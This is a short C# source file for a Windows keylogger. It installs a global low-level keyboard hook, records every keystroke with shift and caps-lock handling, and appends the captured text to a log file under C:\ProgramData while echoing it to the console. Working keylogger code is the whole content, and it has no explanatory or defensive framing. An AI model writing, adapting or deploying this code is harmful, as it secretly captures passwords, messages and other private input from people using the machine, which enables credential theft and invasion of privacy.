using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace vrtx_keys {
    class Program {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static int WM_KEYUP = 0x0101;
        private static int HC_ACTION = 0;
        private static int VK_SHIFT = 0x10;
        private static int VK_CAPITAL = 0x14;

        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        private static bool capsPressed = GetKeyState(VK_CAPITAL);

        private static string FILEPATH = @"C:\ProgramData\mylog.txt";

        static void Main(string[] args) {
            hook = SetHook(llkProcedure);
            Application.Run();
            //UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if(nCode >= HC_ACTION) {
                int vkCode = Marshal.ReadInt32(lParam);

                if(wParam == (IntPtr)WM_KEYDOWN) {
                    if(vkCode == VK_CAPITAL)
                        capsPressed = !capsPressed;

                    using(StreamWriter output = File.AppendText(FILEPATH)) {
                        switch(((Keys)vkCode).ToString()) {
                            case "Capital":
                            case "LShiftKey":
                            case "RShiftKey":
                            break;

                            case "Oemcomma":
                                Console.Out.Write(",");
                                output.Write(",");
                                break;

                            case "OemPeriod":
                                Console.Out.Write(".");
                                output.Write(".");
                                break;

                            case "Return":
                                Console.Out.Write("\n");
                                output.Write("\n");
                                break;

                            case "Space":
                                Console.Out.Write(" ");
                                output.Write(" ");
                                break;

                            case "Tab":
                                Console.Out.Write("    ");
                                output.Write("    ");
                                break;

                            default:
                                if(GetAsyncKeyState(VK_SHIFT) ^ capsPressed) {
                                    Console.Out.Write((Keys)vkCode);
                                    output.Write((Keys)vkCode);
                                }
                                else {
                                    Console.Out.Write(((Keys)vkCode).ToString().ToLower());
                                    output.Write(((Keys)vkCode).ToString().ToLower());
                                }
                            break;
                        }
                    }
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern bool GetKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern bool GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}